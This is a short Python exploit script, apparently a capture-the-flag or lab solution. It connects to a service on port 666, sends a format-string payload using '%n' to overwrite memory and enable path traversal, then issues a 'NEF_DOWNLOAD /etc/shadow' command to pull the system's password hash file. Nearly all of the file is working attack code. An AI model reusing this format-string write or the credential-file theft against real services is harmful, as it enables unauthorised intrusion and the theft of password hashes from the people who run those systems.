import socket


def send_cmd(payload, recv_after=True):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('0.0.0.0', 666))
    for a in payload.split('\n'):
        if a and a != "":
            print(f"Sending {a}")
            s.send((a + "\n").encode())

    if recv_after:
        d = s.recv(1024)
        while d:
            print(d.decode())
            d = s.recv(1024)
    else:
        s.close()

if __name__ == '__main__':
    enable_path_traversal = "%lu%lu%lu%lu%lu%230x%n\n"
    get_passwd_file = "NEF_DOWNLOAD /etc/shadow\n"


    send_cmd(enable_path_traversal)
    send_cmd(get_passwd_file, True)
